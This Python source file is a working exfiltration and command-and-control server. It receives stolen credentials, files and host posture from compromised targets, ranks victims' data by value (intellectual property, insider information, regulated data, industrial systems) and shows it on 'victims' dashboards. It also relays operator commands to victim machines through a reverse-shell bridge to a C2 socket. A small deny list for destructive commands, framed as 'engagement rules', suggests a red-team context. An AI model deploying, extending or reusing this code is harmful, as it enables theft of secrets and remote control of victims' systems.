#!/usr/bin/env python3
"""dnsproxy_ingest - HTTPS exfiltration dashboard on the DNS server.

  POST /ingest        JSON record {target,user,ts,creds,files,datasets,posture,primitives,assets} -> append JSONL
  GET  /              investor animation (investor.html) with live /api/records
  GET  /dashboard     plain HTML table: target | user | credentials | files | datasets | posture
  GET  /victims       asset register page (victims.html): victim -> core_ip/mnpi/regulated/ot_iot
  GET  /api/records   JSON of all records
  GET  /api/victims   JSON of records grouped per target+user with classified assets

Run on dns1:  python3 dnsproxy_ingest.py      (env INGEST_PORT INGEST_DATA)
"""
import html
import json
import os
import re
import socket
import ssl
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("INGEST_PORT", "8443"))
DATA = os.environ.get("INGEST_DATA", os.path.join(os.path.dirname(os.path.abspath(__file__)), "ingest_records.jsonl"))
CERT = os.environ.get("INGEST_CERT", os.path.join(os.path.dirname(os.path.abspath(__file__)), "ingest_cert.pem"))
KEY = os.environ.get("INGEST_KEY", os.path.join(os.path.dirname(os.path.abspath(__file__)), "ingest_key.pem"))
INVESTOR = os.environ.get("INGEST_INVESTOR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "investor.html"))
VICTIMS = os.environ.get("INGEST_VICTIMS", os.path.join(os.path.dirname(os.path.abspath(__file__)), "victims.html"))
SHELL_PAGE = os.environ.get("INGEST_SHELL", os.path.join(os.path.dirname(os.path.abspath(__file__)), "shell.html"))
CTL_HOST = os.environ.get("SHELL_CTL_HOST", "127.0.0.1")
CTL_PORT = int(os.environ.get("SHELL_CTL_PORT", "9443"))

records = []
shell_history = {}   # sid -> [ {t, cmd, ok, out, ms} ]

# mirror of stage.js classifyAssets() — records ingested before the agent
# classified assets server-side get the same treatment at intake time
FILE_RULES = [
    ("ot_iot", re.compile(r"(?:^|[/\\])(?:ot|scada|plc|hmi|iot|industrial)(?:[/\\])|scada|plc[_-]|gateway[_-]?(?:config|cfg)|modbus|bacnet|device[_-]?registry|firmware|(?:router|switch|firewall|nvr|camera)[_-]?config|\.(?:cfg|conf|ini)$", re.I)),
    ("regulated", re.compile(r"clinical|trial|phase[_ -]?[0-9]|\bphi\b|patient|claims|underwrit|health|medical|pharma|genomic|insurance|epidemi|regulator|monetary|banking|gov[_-]?sg", re.I)),
    ("mnpi", re.compile(r"board|earning|\bmna\b|merger|deal[_ -]|pipeline|forecast|treasury|compensation|strateg|confidential|nnda|insider|quarterly|unannounced", re.I)),
    ("core_ip", re.compile(r"(?:^|[/\\])(?:src|code|research|models?|ml[_-]?weights|patent|formulas?|proto)(?:[/\\])|\.sql$|\.ipynb$|model[_-]?(?:card|artifact|registry)|trade[_-]?secret|source[_-]?code|proprietary", re.I)),
]
CRED_IP = re.compile(r"env:.*(?:GITHUB|GH_|GITLAB|NPM_|DOCKER|CI_)", re.I)
ASSET_CLASSES = ("core_ip", "mnpi", "regulated", "ot_iot")


def classify(rec):
    assets = {c: [] for c in ASSET_CLASSES}

    def cap(cls, ent):
        if len(assets[cls]) < 80:
            assets[cls].append(ent)

    for f in rec.get("files") or []:
        p = str(f.get("path", ""))
        size = f"{f.get('size', 0) or 0} B"
        hit = next((cls for cls, rx in FILE_RULES if rx.search(p)), None)
        if hit:
            cap(hit, {"src": "key" if f.get("kind") == "credential" else "file", "label": p, "value": size})
        elif f.get("kind") == "credential":
            cap("core_ip", {"src": "key", "label": p, "value": size})
    for c in rec.get("creds") or []:
        k = str(c.get("kind", "secret"))
        # npm_* build settings are not secrets (legacy records) unless auth-related
        if k.lower().startswith("env:npm_") and not re.search(r"auth|token|secret|key|password", k, re.I):
            continue
        v = str(c.get("value", ""))[:160]
        cap("core_ip" if CRED_IP.search(k) else "mnpi", {"src": "credential", "label": k, "value": v})
    for d in rec.get("datasets") or []:
        cap("regulated", {"src": "dataset",
                          "label": str(d.get("name") or d.get("id") or ""),
                          "value": str(d.get("agency") or "")})
    return assets


def victims():
    groups = {}
    for r in records:
        key = (str(r.get("target", "?")), str(r.get("user", "?")))
        g = groups.get(key)
        if g is None:
            g = groups[key] = {
                "target": key[0], "user": key[1], "runs": 0,
                "ts": str(r.get("ts", "")), "last": str(r.get("ts", "")),
                "platform": str(r.get("platform") or ""),
                "assets": {c: [] for c in ASSET_CLASSES},
                "posture": {}, "scanner": None,
            }
        g["runs"] += 1
        ts = str(r.get("ts", ""))
        if ts >= g["last"]:
            g["last"] = ts
            g["platform"] = str(r.get("platform") or g["platform"])
        for cls, items in (r.get("assets") or classify(r)).items():
            if cls in g["assets"]:
                g["assets"][cls].extend(items)
        g["posture"] = r.get("posture") or g["posture"]
        sc = (r.get("posture") or {}).get("scanner")
        if sc:
            g["scanner"] = sc
    out = list(groups.values())
    for g in out:
        for cls in ASSET_CLASSES:
            seen, ded = set(), []
            for it in g["assets"][cls]:
                k = (it.get("label"), it.get("value"))
                if k in seen:
                    continue
                seen.add(k)
                ded.append(it)
            g["assets"][cls] = ded[:120]
        g["counts"] = {cls: len(g["assets"][cls]) for cls in ASSET_CLASSES}
        g["total"] = sum(g["counts"].values())
    out.sort(key=lambda g: g["last"], reverse=True)
    return out


def load():
    global records
    try:
        with open(DATA) as f:
            records = [json.loads(line) for line in f if line.strip()]
    except FileNotFoundError:
        records = []


def dashboard():
    rows = []
    for r in records:
        creds = r.get("creds", [])
        files = r.get("files", [])
        datasets = r.get("datasets", [])
        cred_html = "<br>".join(
            f"<code>{html.escape(str(c.get('kind','?')))}</code> "
            f"<span class=v>{html.escape(str(c.get('value',''))[:80])}</span>"
            for c in creds) or "<i>none</i>"
        file_html = f"{len(files)} files"
        if files:
            total = sum(int(f.get('size', 0) or 0) for f in files)
            file_html = f"{len(files)} files / {total} bytes<br>"
            file_html += "<br>".join(
                f"<span class=f>{html.escape(str(f.get('path','')))}</span> "
                f"<i>({f.get('size','?')}b)</i>" for f in files[:12])
            if len(files) > 12:
                file_html += f"<br><i>+{len(files)-12} more…</i>"
        ds_html = f"{len(datasets)} datasets"
        if datasets:
            ds_html += "<br>" + "<br>".join(
                f"<span class=f>{html.escape(str(d.get('name',''))[:60])}</span> "
                f"<i>({html.escape(str(d.get('agency',''))[:40])})</i>"
                for d in datasets[:8])
            if len(datasets) > 8:
                ds_html += f"<br><i>+{len(datasets)-8} more…</i>"
        posture = r.get("posture") or {}
        p_bits = []
        if "uid" in posture:
            p_bits.append(f"uid={posture.get('uid')}")
        if "sudoPasswordless" in posture:
            p_bits.append("sudo=" + ("YES" if posture.get("sudoPasswordless") else "no"))
        if posture.get("apparmorProfile"):
            p_bits.append(str(posture.get("apparmorProfile"))[:40])
        pv = posture.get("vault") or {}
        if pv:
            p_bits.append(f"vault={pv.get('granted')}/{pv.get('configured')} paths")
        p_html = "<br>".join(html.escape(b) for b in p_bits) or "<i>n/a</i>"
        rows.append(
            f"<tr><td>{html.escape(str(r.get('ts','')))}</td>"
            f"<td><b>{html.escape(str(r.get('target','?')))}</b><br>"
            f"{html.escape(str(r.get('user','?')))}</td>"
            f"<td class=c>{cred_html}</td><td>{file_html}</td><td>{ds_html}</td><td>{p_html}</td></tr>")
    body = "\n".join(rows) or "<tr><td colspan=6><i>no records yet</i></td></tr>"
    return f"""<!doctype html><html><head><meta charset=utf-8>
<title>acme telemetry</title><style>
body{{font-family:ui-monospace,Menlo,monospace;background:#0b0f14;color:#cdd6e0;margin:2rem}}
h1{{font-size:1.1rem;color:#7dd3fc}} table{{border-collapse:collapse;width:100%}}
td,th{{border:1px solid #1e293b;padding:.5rem;vertical-align:top;font-size:.85rem}}
th{{background:#111827;color:#7dd3fc;text-align:left}} .v{{color:#fbbf24;font-size:.75rem}}
.f{{color:#86efac;font-size:.78rem}} i{{color:#64748b}} code{{color:#f472b6}}
tr:hover{{background:#0f172a}}</style></head><body>
<h1>acme corp — telemetry intake :: {len(records)} record(s)</h1>
<table><tr><th>time</th><th>target / user</th><th>credentials</th><th>files</th><th>datasets</th><th>posture</th></tr>
{body}</table></body></html>"""


# ── reverse-shell bridge: :8443 <-> QUIC C2 control socket (127.0.0.1:9443) ──

DENY_RE = re.compile(
    r"rm\s+-rf\s+/\s*(?:$|[\s;|&])|rm\s+-rf\s+~|mkfs|\bof=/dev/|"
    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;|"
    r"shutdown|reboot\s*$|\bhalt\b|format\s+[a-z]:|diskpart|bcdedit|"
    r"vssadmin\s+delete|wevtutil\s+cl|reg\s+delete|cipher\s+/w|\bshred\b|"
    r"del\s+/[fsq].*[a-z]:\\\\|Remove-Item\b[^|;&]*-Recurse\b[^|;&]*[Cc]:\\\\Windows",
    re.I)


def ctl_call(req, timeout=25):
    """One JSON-line request/response against the local QUIC C2 control API."""
    with socket.create_connection((CTL_HOST, CTL_PORT), 5) as s:
        s.settimeout(timeout)
        s.sendall((json.dumps(req) + "\n").encode())
        buf = b""
        while b"\n" not in buf:
            chunk = s.recv(65536)
            if not chunk:
                break
            buf += chunk
        if not buf:
            raise ConnectionError("control api closed")
        return json.loads(buf.split(b"\n", 1)[0])


def shell_sessions():
    try:
        r = ctl_call({"op": "sessions"}, timeout=5)
        sessions = r.get("sessions", []) if r.get("ok") else []
    except OSError:
        return []
    # one chip per victim — keep the newest connection per target|user
    best = {}
    for s in sessions:
        key = (s.get("target"), s.get("user"))
        if key not in best or s.get("sid", 0) > best[key].get("sid", 0):
            best[key] = s
    return sorted(best.values(), key=lambda s: s.get("sid", 0))


def hist_add(sid, cmd, ok, out, ms=0):
    h = shell_history.setdefault(sid, [])
    h.append({"t": time.strftime("%H:%M:%S"), "cmd": cmd, "ok": bool(ok),
              "out": (out or "")[:4000], "ms": ms})
    del h[:-500]


def shell_exec(payload):
    try:
        sid = int(payload.get("sid", -1))
    except (TypeError, ValueError):
        return {"ok": False, "error": "bad sid"}
    cmd = str(payload.get("cmd", "")).strip()
    timeout = float(payload.get("timeout", 10) or 10)
    if not cmd:
        return {"ok": False, "error": "empty command"}
    if DENY_RE.search(cmd):
        hist_add(sid, cmd, False, "blocked: destructive command (engagement rules)")
        return {"ok": False, "error": "blocked: destructive command (engagement rules)"}
    from toolkit import run_toolkit          # WS9 — returns None when not a toolkit cmd
    try:
        resp = run_toolkit(sid, cmd, timeout, ctl_call, shell_sessions, records, hist_add)
    except Exception as e:                   # a toolkit bug must never kill the response
        resp = {"ok": False, "error": f"toolkit error: {e}"}
    if resp is None:
        try:
            resp = ctl_call({"op": "exec", "sid": sid, "cmd": cmd,
                             "timeout": timeout}, timeout=timeout + 10)
        except OSError as e:
            resp = {"ok": False, "error": f"control api unavailable: {e}"}
    hist_add(sid, cmd, resp.get("ok"),
             resp.get("output") or resp.get("error") or "", resp.get("ms", 0))
    return resp


class H(BaseHTTPRequestHandler):
    def _send(self, code, body, ctype):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        path = self.path.rstrip("/")
        if path == "/api/shell/exec":
            n = int(self.headers.get("Content-Length", 0) or 0)
            try:
                payload = json.loads(self.rfile.read(n))
            except Exception:
                return self._send(400, '{"error":"bad json"}', "application/json")
            return self._send(200, json.dumps(shell_exec(payload)), "application/json")
        if path != "/ingest":
            return self._send(404, b"not found", "text/plain")
        n = int(self.headers.get("Content-Length", 0) or 0)
        try:
            rec = json.loads(self.rfile.read(n))
        except Exception:
            return self._send(400, b'{"error":"bad json"}', "application/json")
        rec.setdefault("ts", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
        records.append(rec)
        try:
            with open(DATA, "a") as f:
                f.write(json.dumps(rec) + "\n")
        except Exception as e:
            print(f"[-] persist: {e}")
        print(f"[+] ingest target={rec.get('target')} user={rec.get('user')} "
              f"creds={len(rec.get('creds', []))} files={len(rec.get('files', []))} "
              f"datasets={len(rec.get('datasets', []))}", flush=True)
        self._send(200, '{"ok":true}', "application/json")

    def do_GET(self):
        raw = self.path
        path = raw.split("?")[0].rstrip("/")
        if path in ("", "/index.html", "/dashboard"):
            if path != "/dashboard":
                try:
                    with open(INVESTOR, "rb") as f:
                        return self._send(200, f.read(), "text/html; charset=utf-8")
                except OSError:
                    pass  # fall back to the plain table
            return self._send(200, dashboard(), "text/html; charset=utf-8")
        if path == "/victims":
            try:
                with open(VICTIMS, "rb") as f:
                    return self._send(200, f.read(), "text/html; charset=utf-8")
            except OSError:
                return self._send(404, b"victims.html missing", "text/plain")
        if path == "/shell":
            try:
                with open(SHELL_PAGE, "rb") as f:
                    return self._send(200, f.read(), "text/html; charset=utf-8")
            except OSError:
                return self._send(404, b"shell.html missing", "text/plain")
        if path == "/api/records":
            return self._send(200, json.dumps(records), "application/json")
        if path == "/api/victims":
            return self._send(200, json.dumps(victims()), "application/json")
        if path == "/api/shell/sessions":
            return self._send(200, json.dumps({"sessions": shell_sessions()}),
                              "application/json")
        if path.startswith("/api/shell/history"):
            q = raw.split("?", 1)[-1] if "?" in raw else ""
            sid = None
            for part in q.split("&"):
                if part.startswith("sid="):
                    try:
                        sid = int(part[4:])
                    except ValueError:
                        pass
            return self._send(200, json.dumps(
                {"history": shell_history.get(sid, [])}), "application/json")
        self._send(404, b"not found", "text/plain")

    def log_message(self, fmt, *a):
        sys.stderr.write("[ingest] %s\n" % (fmt % a))


def main():
    load()
    if not (os.path.exists(CERT) and os.path.exists(KEY)):
        print(f"[-] missing cert/key: {CERT} {KEY}", file=sys.stderr)
        sys.exit(1)
    srv = ThreadingHTTPServer(("0.0.0.0", PORT), H)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f"[*] dnsproxy_ingest https://0.0.0.0:{PORT} records={len(records)} data={DATA}")
    srv.serve_forever()


if __name__ == "__main__":
    main()
